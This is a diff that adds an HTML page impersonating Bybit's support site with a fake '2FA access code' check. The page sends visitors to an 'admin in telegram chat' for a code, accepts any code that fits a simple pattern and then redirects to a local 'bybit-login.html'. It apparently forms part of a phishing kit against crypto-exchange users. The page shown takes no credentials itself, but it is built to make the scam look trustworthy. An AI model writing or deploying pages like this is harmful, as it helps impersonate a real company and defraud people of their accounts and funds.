@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bybit - 2FA Access Code Verification</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="layout">
+        <main class="main-content">
+            <header class="header">
+                <div class="header-left">
+                    <img src="bybit logo/bybit.png" alt="Bybit Logo" class="header-logo">
+                    <h1 class="header-title">Bybit Support</h1>
+                </div>
+                <div class="header-right">
+                    <button class="header-button" onclick="window.location.href='notifications.html'">
+                        <i class="fas fa-bell"></i>
+                    </button>
+                    <button class="header-button" onclick="window.location.href='https://www.bybit.com/login'">
+                        <i class="fas fa-user"></i>
+                    </button>
+                </div>
+            </header>
+
+            <div class="content-wrapper">
+                <div class="card">
+                    <div class="security-notice">
+                        <i class="fas fa-shield-alt security-icon"></i>
+                        <p>Please contact the Bybit admin in chat to receive your 2FA access code.</p>
+                    </div>
+
+                    <form id="verifyForm" class="verify-form">
+                        <div class="form-group">
+                            <label for="accessCode">2FA Access Code</label>
+                            <input type="text" id="accessCode" name="accessCode" required 
+                                   placeholder="Enter 2FA access code" 
+                                   maxlength="6" 
+                                   style="text-transform: uppercase;">
+                            <div id="errorMessage" class="error-message" style="display: none; margin-top: 5px; font-size: 0.9em;"></div>
+                        </div>
+                        <button type="submit" class="btn-primary">Verify 2FA Access Code</button>
+                    </form>
+
+                    <div class="security-features">
+                        <div class="feature">
+                            <i class="fas fa-lock feature-icon"></i>
+                            <span>Secure Verification</span>
+                        </div>
+                        <div class="feature">
+                            <i class="fas fa-shield-alt feature-icon"></i>
+                            <span>Protected Process</span>
+                        </div>
+                        <div class="feature">
+                            <i class="fas fa-user-shield feature-icon"></i>
+                            <span>Admin Verified</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <footer class="footer">
+                <div class="footer-content">
+                    <div class="footer-links">
+                        <a href="https://www.bybit.com/about" class="footer-link" target="_blank" rel="noopener noreferrer">About Us</a>
+                        <a href="https://www.bybit.com/terms" class="footer-link" target="_blank" rel="noopener noreferrer">Terms of Service</a>
+                        <a href="https://www.bybit.com/privacy" class="footer-link" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
+                        <a href="https://www.bybit.com/support" class="footer-link" target="_blank" rel="noopener noreferrer">Contact Support</a>
+                    </div>
+                    <div class="footer-copyright">
+                        © 2024 Bybit. All rights reserved.
+                    </div>
+                </div>
+            </footer>
+        </main>
+    </div>
+
+    <script src="utils.js"></script>
+    <script src="modal-utils.js"></script>
+    <script src="notification-system.js"></script>
+    <script src="sendgrid-config.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('verifyForm');
+            const accessCodeInput = document.getElementById('accessCode');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const accessCode = accessCodeInput.value.toUpperCase();
+                const codePattern = /^[1-6]{4}[A-Z]{2}$/;
+                
+                if (!accessCode) {
+                    errorMessage.textContent = 'Access denied. Please request for correct access code from the admin in telegram chat';
+                    errorMessage.style.color = '#ff4444';
+                    errorMessage.style.display = 'block';
+                    return;
+                }
+                
+                if (!codePattern.test(accessCode)) {
+                    errorMessage.textContent = 'Access denied. Please request for correct access code from the admin in telegram chat';
+                    errorMessage.style.color = '#ff4444';
+                    errorMessage.style.display = 'block';
+                    return;
+                }
+                
+                // If we get here, the format is correct
+                errorMessage.textContent = 'Access granted';
+                errorMessage.style.color = '#00ff88';
+                errorMessage.style.display = 'block';
+                
+                // Store access code and redirect after a short delay
+                sessionStorage.setItem('2faAccessCode', accessCode);
+                setTimeout(() => {
+                    window.location.href = 'bybit-login.html';
+                }, 1000);
+            });
+
+            // Clear error message when user starts typing
+            accessCodeInput.addEventListener('input', function() {
+                errorMessage.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html> 
